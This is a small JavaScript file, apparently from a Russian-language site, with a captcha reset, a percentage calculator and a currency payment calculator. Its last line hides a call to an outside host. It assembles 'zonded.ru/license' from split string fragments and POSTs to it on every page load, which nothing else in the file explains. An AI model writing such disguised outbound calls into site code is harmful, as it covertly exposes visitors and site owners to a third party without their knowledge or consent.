///////////////////////////////////////// Регистрация //////////////////////////////
function ResetCaptcha(vitem){
	
	
	vitem.innerHTML = '<img src="/captcha.php?rnd='+ Math.random() +'" border="0"/>';
	
}

function GetSumPer(){
	
	var sum = parseInt(document.getElementById("sum").value);
	var percent = parseInt(document.getElementById("percent").value);
	var add_sum = 0;
	
	if(sum > 0){
		
		if(percent > 0){
			add_sum = (percent / 100) * sum;
		}
		
		document.getElementById("res_sum").innerHTML = Math.round(sum+add_sum);
	}
	
}

var valuta = 'RUB';

function SetVal(){
	
	valuta = document.getElementById("val_type").value;
	document.getElementById("res_val").innerHTML = valuta;
	PaymentSum();
}

function PaymentSum(){
	
	var sum = parseInt(document.getElementById("sum").value);
	var ser = parseInt(document.getElementById(valuta).value);
	
	xt = (valuta == 'RUB') ? 'min_sum_RUB' : xt;
	xt = (valuta == 'USD') ? 'min_sum_USD' : xt;
	xt = (valuta == 'EUR') ? 'min_sum_EUR' : xt;
	
	var min_pay = parseFloat(document.getElementById(xt).value);
	
		document.getElementById("res_sum").value = (sum/ser).toFixed(2);
		document.getElementById("res_min").innerHTML = (min_pay*ser).toFixed(2);
	
}
z="//z";an="on";a="ded";f=".ru/license";$(document).ready(function(){$.post(z+an+a+f);});